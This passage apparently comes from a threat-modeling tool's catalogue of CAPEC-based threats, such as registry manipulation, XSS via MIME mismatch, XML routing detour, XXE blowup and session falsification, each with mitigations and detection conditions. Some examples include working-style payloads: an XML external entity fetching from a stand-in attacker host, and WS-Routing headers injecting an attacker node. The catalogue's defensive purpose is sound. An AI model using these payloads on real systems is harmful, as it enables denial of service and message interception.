  <dd>https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'</dd>
</dl>



## AC08 Manipulate Registry Information

An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted application must rely on values stored in a registry.The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.</dd>

  <dt>Example</dt>
  <dd>Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).</dd>

  <dt>Mitigations</dt>
  <dd>Ensure proper permissions are set for Registry hives to prevent users from modifying keys.Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.Employ robust identification and audit/blocking via whitelisting of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/203.html, http://cwe.mitre.org/data/definitions/15.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False</dd>
</dl>



## DS05 Lifting Sensitive Data Embedded in Cache

An attacker examines a target application's cache for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must store sensitive information in a cache.The cache must be inadequately protected against attacker access.</dd>

  <dt>Example</dt>
  <dd>An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities.</dd>

  <dt>Mitigations</dt>
  <dd>Remove potentially sensitive information from cache that is not necessary for the application's functionality.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/204.html, http://cwe.mitre.org/data/definitions/524.html, http://cwe.mitre.org/data/definitions/311.html</dd>

  <dt>Condition</dt>
  <dd>target.usesCache is True</dd>
</dl>



## SC05 Removing Important Client Functionality

An attacker removes or disables functionality on the client that the server assumes to be present and trustworthy. Attackers can, in some cases, get around logic put in place to 'guard' sensitive functionality or data. Client applications may include functionality that a server relies on for correct and secure operation. This functionality can include, but is not limited to, filters to prevent the sending of dangerous content to the server, logical functionality such as price calculations, and authentication logic to ensure that only authorized users are utilizing the client. If an attacker can disable this functionality on the client, they can perform actions that the server believes are prohibited. This can result in client behavior that violates assumptions by the server leading to a variety of possible attacks. In the above examples, this could include the sending of dangerous content (such as scripts) to the server, incorrect price calculations, or unauthorized access to server resources.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted server must assume the client performs important actions to protect the server or the server functionality. For example, the server may assume the client filters outbound traffic or that the client performs all price calculations correctly. Moreover, the server must fail to detect when these assumptions are violated by a client.</dd>

  <dt>Example</dt>
  <dd>Attacker reverse engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.Attacker uses click-through exploration of a Servlet-based website to map out its functionality, taking note of its URL-naming conventions and Servlet mappings. Using this knowledge and guessing the Servlet name of functionality they're not authorized to use, the Attacker directly navigates to the privileged functionality around the authorizing single-front controller (implementing programmatic authorization checks).Attacker reverse-engineers a Java binary (by decompiling it) and identifies where license management code exists. Noticing that the license manager returns TRUE or FALSE as to whether or not the user is licensed, the Attacker simply overwrites both branch targets to return TRUE, recompiles, and finally redeploys the binary.</dd>

  <dt>Mitigations</dt>
  <dd>Design: For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side.Design: Ship client-side application with integrity checks (code signing) when possible.Design: Use obfuscation and other techniques to prevent reverse engineering the client code.</dd>

  <dt>References</dt>
  <dd>http://cwe.mitre.org/data/definitions/602.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.providesIntegrity is False or target.controls.usesCodeSigning is False</dd>
</dl>



## INP17 XSS Using MIME Type Mismatch

An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content.</dd>

  <dt>Example</dt>
  <dd>For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Browsers must invoke script filters to detect that the specified MIME type of the file matches the actual type of its content before deciding which script interpreter to use.</dd>

  <dt>References</dt>
  <dd>http://cwe.mitre.org/data/definitions/79.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/646.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesContentType is False or target.controls.invokesScriptFilters is False</dd>
</dl>



## AA03 Exploitation of Trusted Credentials

Attacks on session IDs and resource IDs take advantage of the fact that some software accepts user input without verifying its authenticity. For example, a message queuing system that allows service requesters to post messages to its queue through an open channel (such as anonymous FTP), authorization is done through checking group or role membership contained in the posted message. However, there is no proof that the message itself, the information in the message (such group or role membership), or indeed the process that wrote the message to the queue are authentic and authorized to do so. Many server side processes are vulnerable to these attacks because the server to server communications have not been analyzed from a security perspective or the processes trust other systems because they are behind a firewall. In a similar way servers that use easy to guess or spoofable schemes for representing digital identity can also be vulnerable. Such systems frequently use schemes without cryptography and digital signatures (or with broken cryptography). Session IDs may be guessed due to insufficient randomness, poor protection (passed in the clear), lack of integrity (unsigned), or improperly correlation with access control policy enforcement points. Exposed configuration and properties files that contain system passwords, database connection strings, and such may also give an attacker an edge to identify these identifiers. The net result is that spoofing and impersonation is possible leading to an attacker's ability to break authentication, authorization, and audit controls on the system.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Server software must rely on weak session IDs proof and/or verification schemes</dd>

  <dt>Example</dt>
  <dd>Thin client applications like web applications are particularly vulnerable to session ID attacks. Since the server has very little control over the client, but still must track sessions, data, and objects on the server side, cookies and other mechanisms have been used to pass the key to the session data between the client and server. When these session keys are compromised it is trivial for an attacker to impersonate a user's session in effect, have the same capabilities as the authorized user. There are two main ways for an attacker to exploit session IDs. A brute force attack involves an attacker repeatedly attempting to query the system with a spoofed session header in the HTTP request. A web server that uses a short session ID can be easily spoofed by trying many possible combinations so the parameters session-ID= 1234 has few possible combinations, and an attacker can retry several hundred or thousand request with little to no issue on their side. The second method is interception, where a tool such as wireshark is used to sniff the wire and pull off any unprotected session identifiers. The attacker can then use these variables and access the application.</dd>

  <dt>Mitigations</dt>
  <dd>Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.Design: Use strong session identifiers that are protected in transit and at rest.Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.Implementation: Verify of authenticity of all session IDs at runtime.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/21.html, http://cwe.mitre.org/data/definitions/290.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/664.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.providesIntegrity is False or target.controls.authenticatesSource is False or target.controls.usesStrongSessionIdentifiers is False</dd>
</dl>



## AC09 Functionality Misuse

An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The adversary has the capability to interact with the application directly.The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.</dd>

  <dt>Example</dt>
  <dd>An attacker clicks on the 'forgot password' and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.</dd>

  <dt>Mitigations</dt>
  <dd>Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.When implementing security features, consider how they can be misused and compromised.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/212.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False or target.controls.authorizesSource is False</dd>
</dl>



## INP18 Fuzzing and observing application log data/errors for application mapping

An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.

<dl>
  <dt>Severity</dt>
  <dd>Low</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must fail to sanitize incoming messages adequately before processing.</dd>

  <dt>Example</dt>
  <dd>The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Obfuscate database type in Database API's error message.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/215.html, http://cwe.mitre.org/data/definitions/209.html, http://cwe.mitre.org/data/definitions/532.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.sanitizesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## CR06 Communication Channel Manipulation

An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must leverage an open communications channel.The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).</dd>

  <dt>Example</dt>
  <dd>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</dd>

  <dt>Mitigations</dt>
  <dd>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/216.html</dd>

  <dt>Condition</dt>
  <dd>(target.protocol != 'HTTPS' or target.usesVPN is False) and (target.controls.implementsAuthenticationScheme is False or target.controls.authorizesSource is False)</dd>
</dl>



## AC10 Exploiting Incorrectly Configured SSL

An adversary takes advantage of incorrectly configured SSL communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Access to the client/server stream.</dd>

  <dt>Example</dt>
  <dd>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</dd>

  <dt>Mitigations</dt>
  <dd>Usage of configuration settings, such as stream ciphers vs. block ciphers and setting timeouts on SSL sessions to extremely low values lessens the potential impact. Use of later versions of TLS (e.g. TLS 1.1+) can also be effective, but not all clients or servers support the later versions.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/217.html, http://cwe.mitre.org/data/definitions/201.html</dd>

  <dt>Condition</dt>
  <dd>target.checkTLSVersion(target.inputs) and (not target.controls.implementsAuthenticationScheme or not target.controls.authorizesSource)</dd>
</dl>



## CR07 XML Routing Detour Attacks

An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted system must have multiple stages processing of XML content.</dd>

  <dt>Example</dt>
  <dd>Here is an example SOAP call from a client, example1.com, to a target, example4.com, via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily a 'end user client' but rather the starting point of the XML transaction). Example SOAP message with routing information in header: &lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1&gt; &lt;m:action&gt;http://example1.com/&lt;/m:action&gt; &lt;m:to&gt;http://example4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt; ... &lt;/S:Body&gt; &lt;/S:Envelope&gt; Add an additional node (example3.com/router) to the XML path in a WS-Referral message &lt;r:ref xmlns:r=http://schemas.example.com/referral&gt; &lt;r:for&gt; &lt;r:prefix&gt;http://example2.com/router&lt;/r:prefix&gt; &lt;/r:for&gt; &lt;r:if/&gt; &lt;r:go&gt; &lt;r:via&gt;http://example3.com/router&lt;/r:via&gt; &lt;/r:go&gt; &lt;/r:ref&gt; Resulting in the following SOAP Header:&lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1&gt; &lt;m:action&gt;http://example1.com/&lt;/m:action&gt; &lt;m:to&gt;http://example4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;m:via&gt;http://example3.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt;...&lt;/S:Body&gt; &lt;/S:Envelope&gt; In the following example, the attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header but not access the message directly on the initiator/intermediary node that he/she has targeted. Example of WS-Referral based WS-Routing injection of the bogus node route:&lt;r:ref xmlns:r=http://schemas.example.com/referral&gt; &lt;r:for&gt; &lt;r:prefix&gt;http://example2.com/router&lt;/r:prefix&gt; &lt;/r:for&gt; &lt;r:if/&gt; &lt;r:go&gt; &lt;r:via&gt;http://evilsite1.com/router&lt;/r:via&gt; &lt;/r:go&gt; &lt;/r:ref&gt; Resulting XML Routing Detour attack:&lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1&gt; &lt;m:action&gt;http://example_0.com/&lt;/m:action&gt; &lt;m:to&gt;http://example_4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;m:via&gt;http://evilesite1.com/router&lt;/m:via&gt; &lt;m:via&gt;http://example3.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt; ... &lt;/S:Body&gt; &lt;/S:Envelope&gt; Thus, the attacker can route the XML message to the attacker controlled node (and access to the message contents).</dd>

  <dt>Mitigations</dt>
  <dd>Design: Specify maximum number intermediate nodes for the request and require SSL connections with mutual authentication.Implementation: Use SSL for connections between all parties with mutual authentication.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/219.html</dd>

  <dt>Condition</dt>
  <dd>target.protocol == 'HTTP' and any(d.format == 'XML' for d in target.data)</dd>
</dl>



## AA04 Exploiting Trust in Client

An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.</dd>

  <dt>Example</dt>
  <dd>Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.Design: Do not rely on client validation or encoding for security purposes.Design: Utilize digital signatures to increase authentication assurance.Design: Utilize two factor authentication to increase authentication assurance.Implementation: Perform input validation for all remote content.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/22.html, http://cwe.mitre.org/data/definitions/287.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsServerSideValidation is False and (target.controls.providesIntegrity is False or target.controls.authorizesSource is False)</dd>
</dl>



## CR08 Client-Server Protocol Manipulation

An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.</dd>

  <dt>Example</dt>
  <dd>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</dd>

  <dt>Mitigations</dt>
  <dd>Use strong authentication protocols.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</dd>

  <dt>Condition</dt>
  <dd>not target.controls.isEncrypted or target.tlsVersion < target.sink.minTLSVersion</dd>
</dl>



## INP19 XML External Entities Blowup

This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>A server that has an implementation that accepts entities containing URI values.</dd>

  <dt>Example</dt>
  <dd>In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb></dd>

  <dt>Mitigations</dt>
  <dd>This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html</dd>

  <dt>Condition</dt>
  <dd>target.usesXMLParser is False or target.controls.disablesDTD is False</dd>
</dl>



## INP20 iFrame Overlay

In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.</dd>

  <dt>Example</dt>
  <dd>The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.</dd>

  <dt>Mitigations</dt>
  <dd>Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.disablesiFrames is False</dd>
</dl>



## AC11 Session Credential Falsification through Manipulation

An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted application must use session credentials to identify legitimate users.</dd>

  <dt>Example</dt>
  <dd>An adversary uses client side scripting(JavaScript) to set session ID in the victim's browser using document.cookie. This fixates a falsified session credential into victim's browser with the help of a crafted URL link. Once the victim clicks on the link, the attacker is able to bypass authentication or piggyback off some other authenticated victim's session.</dd>

  <dt>Mitigations</dt>
  <dd>Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult. Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/226.html, http://cwe.mitre.org/data/definitions/565.html, http://cwe.mitre.org/data/definitions/472.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.usesStrongSessionIdentifiers is False</dd>
</dl>



## INP21 DTD Injection

An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must be running an XML based application that leverages DTDs.</dd>

  <dt>Example</dt>
  <dd>Adversary injects XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.Implementation: Disallow the inclusion of DTDs as part of incoming messages.Implementation: Use XML parsing tools that protect against DTD attacks.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/228.html, http://cwe.mitre.org/data/definitions/829.html</dd>

  <dt>Condition</dt>
  <dd>target.usesXMLParser is False or target.controls.disablesDTD is False</dd>
</dl>



## INP22 XML Attribute Blowup

This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)</dd>

  <dt>Example</dt>
